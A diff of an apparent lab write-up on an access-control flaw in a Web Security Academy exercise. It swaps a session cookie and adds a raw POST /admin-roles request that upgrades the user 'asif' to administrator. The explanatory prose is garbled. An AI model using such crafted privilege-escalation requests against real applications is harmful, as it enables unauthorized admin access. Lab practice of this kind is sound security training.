@@ -73,7 +73,7 @@ If the target user is an application administrator, then the attacker will gain 
  
      GET /my-account?id=khan HTTP/1.1
      Host: acca1f871ff59314c0b1124d00580002.web-security-academy.net
-     Cookie: session=dhb7aRHg7lEnRb2uRogyfXu2onwMp2jY
+     Cookie: session=ai64aRHg7lEnRb2uadg95Xu2onw98v9f
      User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
      Accept-Language: en-US,en;q=0.5
@@ -93,8 +93,27 @@ If the target user is an application administrator, then the attacker will gain 
   Upgrade user name is Asif to change and type khan and send the Request Server and Local user is Upgrade This vulnerabilities
   IS Access-control-vulnerabilities
  
- 
- 
+    POST /admin-roles HTTP/1.1
+    Host: acca1f871ff59314c0b1124d00580002.web-security-academy.net
+    Cookie: session=dhb7aRHg7lEnRb2uRogyfXu2onwMp2jY
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 45
+    Origin: https://acca1f871ff59314c0b1124d00580002.web-security-academy.net
+    Referer: https://acca1f871ff59314c0b1124d00580002.web-security-academy.net/admin-roles
+    Upgrade-Insecure-Requests: 1
+    Sec-Fetch-Dest: document
+    Sec-Fetch-Mode: navigate
+    Sec-Fetch-Site: same-origin
+    Sec-Fetch-User: ?1
+    Te: trailers
+    Connection: close
+
+    action=upgrade&confirmed=true&username=asif
+    
  
  
  
